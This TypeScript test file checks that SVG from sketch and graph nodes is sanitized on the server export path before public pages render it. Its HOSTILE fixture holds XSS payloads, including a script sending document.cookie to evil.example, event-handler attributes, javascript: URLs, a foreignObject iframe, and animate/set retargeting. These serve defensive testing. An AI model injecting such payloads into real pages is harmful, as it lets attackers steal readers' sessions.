/**
 * That a sketch's or a graph's SVG cannot carry script into a reader's session.
 *
 * `SketchNode.exportDOM` and `GraphNode.exportDOM` decode an author-controlled
 * `data:image/svg+xml,…` src into `innerHTML`. That output is cached as the
 * stored HTML of a revision and injected on the **public** `/view/[id]` and
 * `/embed/[id]` pages with `dangerouslySetInnerHTML`, so anything that survives
 * the export runs on this app's origin for every reader — and registration is
 * open, so publishing one post was the whole attack. Both used to strip
 * `<style>` and nothing else.
 *
 * The export is driven through `generateServerHtml` on purpose rather than by
 * calling `exportDOM` directly. That is the *server* path — the one that points
 * `global.window` at a JSDOM instance for the duration of the call — and it is
 * the path a sanitizer is most likely to be silently absent on: DOMPurify's
 * default export binds to whatever `window` existed at import time, which here
 * is none, and an unbound instance returns its input unchanged. A spec that
 * only exercised a browser `window` would pass while `/view` stayed wide open.
 *
 * The browser half of the same helper is covered under jsdom in
 * `packages/editor/src/utils/__tests__/sanitizeSvg.test.ts`.
 */
import type { SerializedEditorState } from "lexical";
import { generateServerHtml } from "@/editor/utils/generateServerHtml";

const EMPTY_CAPTION = {
  editorState: {
    root: {
      children: [
        {
          children: [],
          direction: null,
          format: "",
          indent: 0,
          type: "paragraph",
          version: 1,
        },
      ],
      direction: null,
      format: "",
      indent: 0,
      type: "root",
      version: 1,
    },
  },
};

/** A document holding one sketch or graph whose src is the given SVG. */
const documentWith = (type: "sketch" | "graph", svg: string) =>
  ({
    root: {
      children: [
        {
          altText: type,
          caption: EMPTY_CAPTION,
          height: 300,
          id: "",
          showCaption: false,
          src: `data:image/svg+xml,${encodeURIComponent(svg)}`,
          style: "",
          type,
          value: type === "graph" ? "{}" : [],
          version: 1,
          width: 400,
        },
      ],
      direction: null,
      format: "",
      indent: 0,
      type: "root",
      version: 1,
    },
  }) as unknown as SerializedEditorState;

/**
 * Every injection this export was reachable by. `<image onerror>` and
 * `<svg onload>` fire the moment the markup is inserted with `innerHTML`, and
 * `<a xlink:href="javascript:…">` on the reader's click.
 */
const HOSTILE = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" width="400" height="300">
  <script>fetch("https://evil.example/" + document.cookie)</script>
  <image href="does-not-exist.png" onerror="fetch('https://evil.example/1')" width="10" height="10"/>
  <svg onload="fetch('https://evil.example/2')"></svg>
  <rect width="10" height="10" onclick="fetch('https://evil.example/3')"/>
  <a xlink:href="javascript:fetch('https://evil.example/4')"><text x="1" y="2">click</text></a>
  <foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:fetch('https://evil.example/5')"></iframe></div></foreignObject>
  <use href="https://evil.example/payload.svg#x"/>
  <set attributeName="onload" to="fetch('https://evil.example/6')"/>
  <animate attributeName="href" values="javascript:fetch('https://evil.example/7')"/>
  <path d="M0 0 L10 10" stroke="#1e1e1e"/>
</svg>`;

/**
 * What Excalidraw actually exports, including the shape that forced `<use>`
 * back into the allowlist: an embedded picture is a `<symbol>` in `<defs>` plus
 * a `<use href="#image-…">`, and DOMPurify's svg profile drops `use` by
 * default. Dropping it here would lose every image inside a sketch.
 */
const SKETCH = `<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300" viewBox="0 0 400 300">
  <!-- payload-start --><!-- {"type":"excalidraw","elements":[]} --><!-- payload-end -->
  <defs>
    <style class="style-fonts">@font-face { font-family: Virgil; src: url(data:font/woff2;base64,AAAA); }</style>
    <symbol id="image-abc"><image href="data:image/png;base64,iVBORw0KGgo=" width="100%" height="100%" preserveAspectRatio="none"/></symbol>
    <clipPath id="clip-1"><rect width="40" height="40" rx="6" ry="6"/></clipPath>
    <mask id="mask-1" fill="#fff"><rect x="0" y="0" width="50" height="50"/></mask>
  </defs>
  <g stroke-linecap="round" transform="translate(10 10) rotate(0 60 40)"><path d="M0 0 C20 10, 40 30, 60 40" stroke="#1e1e1e" stroke-width="2" fill="none" stroke-opacity="0.8" fill-rule="evenodd"/></g>
  <g transform="translate(120 20) rotate(0 50 40)" mask="url(#mask-1)" clip-path="url(#clip-1)"><use href="#image-abc" width="100" height="80" opacity="1" transform="scale(1 1)"/></g>
  <g font-family="Virgil, Segoe UI Emoji" font-size="20px" fill="#1e1e1e" text-anchor="middle" style="white-space: pre;"><text x="200" y="250" dominant-baseline="alphabetic">hello</text></g>
  <a href="https://example.com/notes"><rect x="1" y="2" width="8" height="9" fill="transparent"/></a>
</svg>`;

/** A GeoGebra-shaped export: no `viewBox`, which `GraphNode` synthesizes. */
const GRAPH = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="640" height="480">
  <defs><clipPath id="cp"><rect x="0" y="0" width="640" height="480"/></clipPath></defs>
  <g clip-path="url(#cp)">
    <line x1="0" y1="240" x2="640" y2="240" stroke="#000000" stroke-width="1"/>
    <path d="M0,480 C160,320 320,160 640,0" fill="none" stroke="#1565c0" stroke-width="2.5" stroke-linecap="round"/>
    <ellipse cx="320" cy="240" rx="4" ry="4" fill="#d32f2f" stroke="#b71c1c"/>
    <polygon points="0,0 10,0 5,10" fill="#4caf50" fill-opacity="0.4"/>
    <text x="330" y="235" font-family="sans-serif" font-size="16" fill="#000000">A</text>
  </g>
</svg>`;

const EVENT_HANDLER = /\son[a-z]+\s*=/i;

for (const type of ["sketch", "graph"] as const) {
  describe(`${type} exportDOM`, () => {
    it("drops script, event handlers and javascript: URLs", async () => {
      const html = await generateServerHtml(documentWith(type, HOSTILE));

      expect(html).not.toMatch(EVENT_HANDLER);
      expect(html).not.toContain("<script");
      expect(html).not.toContain("javascript:");
      expect(html).not.toContain("evil.example");
      expect(html).not.toContain("foreignObject");
      // `<set>` and `<animate>` can retarget an attribute after the fact, which
      // is an event handler written in two steps.
      expect(html).not.toContain("<set");
      expect(html).not.toContain("<animate");
      // The picture itself still survives the pass.
      expect(html).toContain('d="M0 0 L10 10"');
    });

    it("leaves a `use` that points outside the document behind", async () => {
      const html = await generateServerHtml(documentWith(type, HOSTILE));
      expect(html).not.toContain("evil.example/payload.svg");
    });

    it("renders nothing rather than throwing on an undecodable src", async () => {
      const broken = {
        ...documentWith(type, "<svg/>"),
      } as unknown as {
        root: { children: [{ src: string }] };
      };
      broken.root.children[0].src = "data:image/svg+xml,%E0%A4%A";
      await expect(
        generateServerHtml(broken as unknown as SerializedEditorState),
      ).resolves.toBeTypeOf("string");
    });
  });
}

describe("sketch exportDOM, ordinary content", () => {
  it("keeps the geometry, the embedded image and the author's link", async () => {
    const html = await generateServerHtml(documentWith("sketch", SKETCH));

    expect(html).toContain("<svg");
    expect(html).toContain('d="M0 0 C20 10, 40 30, 60 40"');
    expect(html).toContain('stroke="#1e1e1e"');
    expect(html).toContain('stroke-opacity="0.8"');
    expect(html).toContain('fill-rule="evenodd"');
    expect(html).toContain('transform="translate(10 10) rotate(0 60 40)"');
    expect(html).toContain('mask="url(#mask-1)"');
    expect(html).toContain('clip-path="url(#clip-1)"');
    // The `<symbol>`/`<use>` pair Excalidraw writes for an embedded picture.
    expect(html).toContain('<symbol id="image-abc">');
    expect(html).toContain('href="#image-abc"');
    expect(html).toContain("data:image/png;base64,iVBORw0KGgo=");
    expect(html).toContain(">hello</text>");
    expect(html).toContain('href="https://example.com/notes"');
    // Width and height are re-asserted from the node, as before.
    expect(html).toContain('width="400"');
    expect(html).toContain('height="300"');
    // `<style>` removal and the scene payload strip both still happen.
    expect(html).not.toContain("<style");
    expect(html).not.toContain("payload-start");
    expect(html).not.toContain("excalidraw");
  });
});

describe("graph exportDOM, ordinary content", () => {
  it("keeps the plot and synthesizes the missing viewBox", async () => {
    const html = await generateServerHtml(documentWith("graph", GRAPH));

    expect(html).toContain('d="M0,480 C160,320 320,160 640,0"');
    expect(html).toContain("<ellipse");
    expect(html).toContain("<polygon");
    expect(html).toContain("<line");
    expect(html).toContain('clip-path="url(#cp)"');
    expect(html).toContain(">A</text>");
    // The source declares none, so `GraphNode` writes one from the source's own
    // width/height before overwriting those with the node's.
    expect(html).toContain('viewBox="0 0 640 480"');
    expect(html).toContain('width="400"');
    expect(html).toContain('height="300"');
  });
});
